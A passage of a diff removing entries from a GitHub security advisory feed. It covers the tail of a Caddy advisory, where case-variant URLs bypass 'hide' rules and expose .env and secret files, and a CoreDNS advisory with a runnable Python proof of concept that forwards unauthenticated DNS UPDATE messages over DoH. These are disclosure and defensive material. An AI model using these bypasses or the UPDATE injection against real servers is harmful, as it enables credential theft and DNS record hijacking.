-DATABASE_URL=postgres://user:pass@host (UPPERCASE BYPASS)
-
-PS&gt; curl.exe -i http://localhost:8080/secrets/api.txt
-HTTP/1.1 404 Not Found
-Content-Length: 0
-
-PS&gt; curl.exe -i http://localhost:8080/SECRETS/api.txt
-HTTP/1.1 200 OK
-Content-Length: 52
-Content-Type: text/plain; charset=utf-8
-supersecret_api_key=sk_live_real (UPPERCASE BYPASS)
-</code></pre>
-<p>Three separate hide rules, three separate uppercase bypasses, all 200 OK with the "hidden" content served.</p>
-<h3 id="why-this-matters-in-practice">Why this matters in practice</h3>
-<p><code>.git</code>, <code>.env</code>, and <code>secrets/</code> are three of the most common entries in production Caddy <code>hide</code> configurations because they correspond to high-value attacker targets:</p>
-<ul>
-<li><code>.git/HEAD</code> + <code>.git/config</code> + <code>.git/objects/</code> → source code disclosure</li>
-<li><code>.env</code> → credentials, API keys, database connection strings</li>
-<li><code>secrets/</code> → operator-named bucket of anything sensitive</li>
-</ul>
-<p>The bug means that on macOS and Windows hosts (and a subset of Linux hosts), the <code>hide</code> directive provides <strong>no protection at all</strong> for these files — only psychological protection. An attacker familiar with this bug will probe with case variants before assuming the files aren't there.</p>
-<h3 id="suggested-fix-1">Suggested fix</h3>
-<p>In <code>fileHidden()</code>, on platforms with case-insensitive filesystems (or when the configured filesystem is case-insensitive), perform the match against the lowercase request path and lowercase pattern. Go's standard library does not expose a portable "is this filesystem case-insensitive" check, so a reasonable conservative approach is to always lowercase both sides on <code>GOOS=darwin</code> and <code>GOOS=windows</code>, and to document for Linux operators that they should not rely on <code>hide</code> if their filesystem has <code>casefold</code> enabled or if they manage their files with case-folding tools.</p>
-<p>Alternative: enforce that paths matched by <code>hide</code> are also matched case-insensitively on all platforms, with an opt-out for operators who genuinely need case-sensitive matching.</p>
-<hr>
-<h2 id="reproduction-kit">Reproduction kit</h2>
-<p>A full reproduction kit (Caddyfiles, docker-compose.yml files, runnable PoCs) is available on request. All exploits in this report were verified against the unmodified official <code>caddy:2.11.3</code> Docker image.</p>
-<h2 id="reporter">Reporter</h2>
-<p>Independent security research. No prior coordination, no other parties notified, no public disclosure prior to this report. Happy to coordinate on disclosure timeline and credit.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/caddyserver/caddy/security/advisories/GHSA-j8px-rmrx-76h9">https://github.com/caddyserver/caddy/security/advisories/GHSA-j8px-rmrx-76h9</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-77281">https://nvd.nist.gov/vuln/detail/CVE-2026-77281</a></li>
-<li><a href="https://github.com/caddyserver/caddy/pull/7761">https://github.com/caddyserver/caddy/pull/7761</a></li>
-<li><a href="https://github.com/caddyserver/caddy/commit/176b043b0104cee3f894023cd5a598ac29e404bb">https://github.com/caddyserver/caddy/commit/176b043b0104cee3f894023cd5a598ac29e404bb</a></li>
-<li><a href="https://github.com/caddyserver/caddy/releases/tag/v2.11.4">https://github.com/caddyserver/caddy/releases/tag/v2.11.4</a></li>
-<li><a href="https://github.com/advisories/GHSA-j8px-rmrx-76h9">https://github.com/advisories/GHSA-j8px-rmrx-76h9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-j8px-rmrx-76h9</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-09-18T13:09:27.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/coredns/coredns] CoreDNS DoH/DoQ/gRPC bypass UPDATE rejection enforced on UDP/TCP]]></title>
-        <id>https://github.com/advisories/GHSA-9gm5-9rfh-m6vx</id>
-        <link href="https://github.com/advisories/GHSA-9gm5-9rfh-m6vx"/>
-        <updated>2026-09-17T20:33:07.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>CoreDNS accepted <a href="https://datatracker.ietf.org/doc/html/rfc2136">RFC 2136</a> UPDATE messages over DoH, DoH3, DoQ, and DNS-over-gRPC, then allowed the <code>proxy</code>/<code>forward</code> plugin to send them unchanged to an upstream DNS server. UDP, TCP, and DoT rejected the same opcode before plugin dispatch.</p>
-<p>If an update-capable upstream trusts CoreDNS's source address or authenticated connection instead of requiring end-to-end TSIG, an unauthenticated client can use CoreDNS to add, replace, or delete DNS records.</p>
-<h3 id="details">Details</h3>
-<p>The affected listeners called <code>dns.Msg.Unpack</code> without the request policy used by the UDP/TCP server:</p>
-<ul>
-<li><a href="https://github.com/coredns/coredns/blob/18a58b9e898ccd95c3f8ee72a37b95b3d1e3e928/plugin/pkg/doh/doh.go#L134-L155">DoH and DoH3</a></li>
-<li><a href="https://github.com/coredns/coredns/blob/18a58b9e898ccd95c3f8ee72a37b95b3d1e3e928/core/dnsserver/server_quic.go#L212-L219">DoQ</a></li>
-<li><a href="https://github.com/coredns/coredns/blob/18a58b9e898ccd95c3f8ee72a37b95b3d1e3e928/core/dnsserver/server_grpc.go#L176-L184">DNS-over-gRPC</a></li>
-</ul>
-<p>CoreDNS routed the message using its Zone question without checking the opcode. <a href="https://github.com/coredns/coredns/blob/18a58b9e898ccd95c3f8ee72a37b95b3d1e3e928/plugin/forward/forward.go#L113-L118"><code>forward</code></a> then passed the original message to the <a href="https://github.com/coredns/coredns/blob/18a58b9e898ccd95c3f8ee72a37b95b3d1e3e928/plugin/pkg/proxy/connect.go#L150-L167">upstream</a>.</p>
-<p>By contrast, <a href="https://github.com/miekg/dns/blob/v1.1.72/acceptfunc.go#L33-L57"><code>dns.DefaultMsgAcceptFunc</code></a> allows only QUERY and NOTIFY. The fix applies that policy to the raw header via <a href="https://github.com/coredns/coredns/blob/530b0a5ff2ad68cc0421f10dd93568945cc671c9/plugin/pkg/dnsutil/message.go#L13-L23"><code>dnsutil.UnpackRequest</code></a> before any affected transport dispatches the request.</p>
-<h3 id="poc">PoC</h3>
-<p>The reproducer starts a standard-library synthetic DNS upstream on loopback, sends an unsigned UPDATE over DoH, and reports whether the upstream received the record. It supports both UDP and TCP because the <code>forward</code> plugin may select either transport. It does not contact or modify a real authoritative server.</p>
-<p>Clone the repository and build the server:</p>
-<pre><code class="language-bash">git clone git@github.com:coredns/coredns.git
-cd coredns
-git checkout d5e54040ffab9a5c12c6de27b66f59f62b385195 # latest pre-fix commit from main
-go build -tags=grpcnotrace -o coredns .
-</code></pre>
-<p>Save this as <code>Corefile.poc</code>:</p>
-<pre><code class="language-text">https://.:8053 {
-    bind 127.0.0.1
-    tls plugin/tls/test_cert.pem plugin/tls/test_key.pem
-    forward . 127.0.0.1:15354
-}
-</code></pre>
-<p>Save this as <code>poc.py</code>:</p>
-<pre><code class="language-python">#!/usr/bin/env python3
-import argparse
-import http.client
-import queue
-import socket
-import ssl
-import struct
-import threading
-
-
-OPCODE_UPDATE = 5
-TYPE_A = 1
-CLASS_IN = 1
-
-
-def encode_name(name):
-    return b"".join(bytes((len(label),)) + label.encode() for label in name.rstrip(".").split(".")) + b"\x00"
-
-
-def update_message():
-    zone = encode_name("example.com.") + struct.pack("!HH", 6, CLASS_IN)
-    update = (
-        encode_name("foo.example.com.")
-        + struct.pack("!HHIH", TYPE_A, CLASS_IN, 300, 4)
-        + socket.inet_aton("192.0.2.123")
-    )
-    header = struct.pack("!HHHHHH", 0x1234, OPCODE_UPDATE &lt;&lt; 11, 1, 0, 1, 0)
-    return header + zone + update
-
-
-def read_name(message, offset):
-    labels = []
-    end = None
-    seen = set()
-    while True:
-        if offset &gt;= len(message) or offset in seen:
-            raise ValueError("invalid DNS name")
-        seen.add(offset)
-        length = message[offset]
-        if length &amp; 0xC0 == 0xC0:
-            if offset + 1 &gt;= len(message):
-                raise ValueError("truncated compression pointer")
-            if end is None:
-                end = offset + 2
-            offset = ((length &amp; 0x3F) &lt;&lt; 8) | message[offset + 1]
-            continue
-        offset += 1
-        if length == 0:
-            return ".".join(labels) + ".", end if end is not None else offset
-        if length &amp; 0xC0 or offset + length &gt; len(message):
-            raise ValueError("invalid DNS label")
-        labels.append(message[offset : offset + length].decode("ascii"))
-        offset += length
-
-
-def question_end(message, count):
-    offset = 12
-    for _ in range(count):
-        _, offset = read_name(message, offset)
-        offset += 4
-        if offset &gt; len(message):
-            raise ValueError("truncated question")
-    return offset
-
-
-def parse_update(message):
-    _, flags, qdcount, _, nscount, _ = struct.unpack_from("!HHHHHH", message)
-    if (flags &gt;&gt; 11) &amp; 0xF != OPCODE_UPDATE or qdcount != 1 or nscount &lt; 1:
-        return None
-    offset = question_end(message, qdcount)
-    name, offset = read_name(message, offset)
-    rrtype, rrclass, ttl, rdlength = struct.unpack_from("!HHIH", message, offset)
-    offset += 10
-    rdata = message[offset : offset + rdlength]
-    if rrtype != TYPE_A or rrclass != CLASS_IN or len(rdata) != 4:
-        return None
-    return name, ttl, socket.inet_ntoa(rdata)
-
-
-def response_for(message):
-    ident, flags, qdcount, _, _, _ = struct.unpack_from("!HHHHHH", message)
-    end = question_end(message, qdcount)
-    response_flags = flags | 0x8000
-    return struct.pack("!HHHHHH", ident, response_flags, qdcount, 0, 0, 0) + message[12:end]
-
-
-def handle_message(message, peer, received):
-    try:
-        update = parse_update(message)
-        response = response_for(message)
-    except (ValueError, struct.error):
-        return None
-    if update is not None:
-        received.put((peer, update))
-    return response
-
-
-def serve_udp(sock, received, stopped):
-    while not stopped.is_set():
-        try:
-            message, peer = sock.recvfrom(65535)
-        except socket.timeout:
-            continue
-        except OSError:
-            return
-        response = handle_message(message, peer, received)
-        if response is not None:
-            sock.sendto(response, peer)
-
-
-def recv_exact(connection, size, stopped):
-    data = bytearray()
-    while len(data) &lt; size and not stopped.is_set():
-        try:
-            chunk = connection.recv(size - len(data))
-        except socket.timeout:
-            continue
-        if not chunk:
-            return None
-        data.extend(chunk)
-    return bytes(data) if len(data) == size else None
-
-
-def serve_tcp(sock, received, stopped):
-    while not stopped.is_set():
-        try:
-            connection, peer = sock.accept()
-        except socket.timeout:
-            continue
-        except OSError:
-            return
-        with connection:
-            connection.settimeout(0.1)
-            while not stopped.is_set():
-                length = recv_exact(connection, 2, stopped)
-                if length is None:
-                    break
-                message = recv_exact(connection, struct.unpack("!H", length)[0], stopped)
-                if message is None:
-                    break
-                response = handle_message(message, peer, received)
-                if response is not None:
-                    connection.sendall(struct.pack("!H", len(response)) + response)
-
-
-def send_doh(host, port, payload, timeout):
-    context = ssl._create_unverified_context()
-    connection = http.client.HTTPSConnection(host, port, timeout=timeout, context=context)
-    try:
-        connection.request(
-            "POST",
-            "/dns-query",
-            body=payload,
-            headers={"Content-Type": "application/dns-message"},
-        )
-        response = connection.getresponse()
-        body = response.read()
-        return response.status, len(body)
-    finally:
-        connection.close()
-
-
-def main():
-    parser = argparse.ArgumentParser(description="Probe whether CoreDNS forwards RFC 2136 UPDATE over DoH")
-    parser.add_argument("--host", default="127.0.0.1")
-    parser.add_argument("--port", type=int, default=8053)
-    parser.add_argument("--upstream-host", default="127.0.0.1")
-    parser.add_argument("--upstream-port", type=int, default=15354)
-    parser.add_argument("--timeout", type=float, default=2.0)
-    parser.add_argument("--expect", choices=("forwarded", "blocked", "either"), default="either")
-    args = parser.parse_args()
-
-    received = queue.Queue()
-    stopped = threading.Event()
-    udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    udp_sock.settimeout(0.1)
-    udp_sock.bind((args.upstream_host, args.upstream_port))
-    tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    tcp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    tcp_sock.settimeout(0.1)
-    tcp_sock.bind((args.upstream_host, args.upstream_port))
-    tcp_sock.listen()
-    threads = [
-        threading.Thread(target=serve_udp, args=(udp_sock, received, stopped), daemon=True),
-        threading.Thread(target=serve_tcp, args=(tcp_sock, received, stopped), daemon=True),
-    ]
-    for thread in threads:
-        thread.start()
-
-    payload = update_message()
-    try:
-        status, response_bytes = send_doh(args.host, args.port, payload, args.timeout)
-        try:
-            peer, update = received.get(timeout=args.timeout)
-        except queue.Empty:
-            peer = update = None
-    finally:
-        stopped.set()
-        udp_sock.close()
-        tcp_sock.close()
-        for thread in threads:
-            thread.join(timeout=1)
-
-    print("payload=%d opcode=UPDATE record=foo.example.com. 300 IN A 192.0.2.123" % len(payload))
-    print("http_status=%d response_bytes=%d" % (status, response_bytes))
-    if update is None:
-        result = "blocked"
-        print("upstream_received_update=false")
-    else:
-        result = "forwarded"
-        name, ttl, address = update
-        print("upstream_received_update=true source=%s:%d" % peer)
-        print("upstream_record=%s %d IN A %s" % (name, ttl, address))
-    print("result=%s" % result)
-
-    if args.expect != "either" and args.expect != result:
-        raise SystemExit("expected %s, got %s" % (args.expect, result))
-
-
-if __name__ == "__main__":
-    main()
-</code></pre>
-<p>Start the vulnerable revision:</p>
-<pre><code class="language-sh">./coredns -conf Corefile.poc
-</code></pre>
-<p>In a second terminal, run the probe:</p>
-<pre><code class="language-console">$ python3 poc.py --expect forwarded
-payload=60 opcode=UPDATE record=foo.example.com. 300 IN A 192.0.2.123
-http_status=200 response_bytes=29
-upstream_received_update=true source=127.0.0.1:52391
-upstream_record=foo.example.com. 300 IN A 192.0.2.123
-result=forwarded
-</code></pre>
-<p>The ephemeral source port varies. The output confirms that the upstream saw the complete UPDATE as a request originating from CoreDNS.</p>
-<p>For comparison, build and start CoreDNS with the fix:</p>
-<pre><code class="language-sh">git checkout 530b0a5ff2ad68cc0421f10dd93568945cc671c9 # fix commit from main
-go build -tags=grpcnotrace -o coredns-fixed .
-./coredns-fixed -conf Corefile.poc
-</code></pre>
-<p>The same probe is rejected before reaching the synthetic upstream:</p>
-<pre><code class="language-console">$ python3 poc.py --expect blocked
-payload=62 opcode=UPDATE record=foo.example.com. 300 IN A 192.0.2.123
-http_status=400 response_bytes=16
-upstream_received_update=false
-result=blocked
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>Exploitation requires all of the following:</p>
-<ul>
-<li>an attacker can reach a CoreDNS DoH, DoH3, DoQ, or DNS-over-gRPC listener</li>
-<li>the selected <code>proxy</code>/<code>forward</code> target accepts RFC 2136 UPDATE</li>
-<li>the upstream trusts CoreDNS's source address or connection and does not require an attacker-unknown TSIG</li>
-</ul>
-<p>The upstream sees the UPDATE as originating from CoreDNS. A successful attack can redirect traffic, take over names, alter mail routing, or disrupt the writable zone. Requiring and validating end-to-end TSIG prevents the demonstrated attack.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/coredns/coredns/security/advisories/GHSA-9gm5-9rfh-m6vx">https://github.com/coredns/coredns/security/advisories/GHSA-9gm5-9rfh-m6vx</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-86003">https://nvd.nist.gov/vuln/detail/CVE-2026-86003</a></li>
-<li><a href="https://github.com/coredns/coredns/commit/530b0a5ff2ad68cc0421f10dd93568945cc671c9">https://github.com/coredns/coredns/commit/530b0a5ff2ad68cc0421f10dd93568945cc671c9</a></li>
-<li><a href="https://github.com/coredns/coredns/releases/tag/v1.14.7">https://github.com/coredns/coredns/releases/tag/v1.14.7</a></li>
-<li><a href="https://github.com/advisories/GHSA-9gm5-9rfh-m6vx">https://github.com/advisories/GHSA-9gm5-9rfh-m6vx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-9gm5-9rfh-m6vx</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-09-17T20:33:05.000Z</published>
     </entry>
 </feed>
